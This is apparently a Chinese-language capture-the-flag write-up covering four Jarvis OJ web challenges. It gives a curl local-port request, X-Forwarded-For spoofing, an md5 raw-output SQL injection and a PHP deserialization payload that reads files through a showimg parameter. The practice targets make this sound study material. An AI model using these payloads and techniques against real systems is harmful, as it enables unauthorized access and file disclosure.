## PORT51
要求使用端口51访问，之前一直以为是header伪造，到处找包含port的header，最后才知道是通过curl命令指定客户端port访问
`curl --local-port 51 http://web.jarvisoj.com:32770/`
## LOCALHOST
修改header X-Forwarded-For
## Login
查看response headers
`Hint: "select * from `admin` where password='".md5($pass,true)."'"`
这里要注入，就要从md5函数中逃逸
https://blog.werner.wiki/php-md5-true-sqli/
这个还是比较神奇的，竟然能找到这样两个字符串
## 神盾局的秘密
读index.php源码`view-source:http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw`
反序列化后，读取文件
payload:view-source:http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}
